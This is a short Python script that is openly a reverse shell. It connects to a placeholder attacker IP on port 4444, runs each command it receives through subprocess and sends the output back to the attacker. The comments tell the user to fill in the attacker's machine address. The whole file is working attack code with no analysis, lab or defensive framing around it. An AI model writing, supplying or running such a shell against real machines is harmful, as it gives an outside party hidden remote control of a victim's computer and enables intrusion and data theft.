import socket
import subprocess

# Replace with attacker's IP and port
attacker_ip = "0.0.0.0"  # Change to your attacker's machine IP
attacker_port = 4444

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((attacker_ip, attacker_port))

while True:
    command = client.recv(1024).decode()  # Receive command
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)  # Execute command
    client.send(output.encode())  # Send output back

client.close()
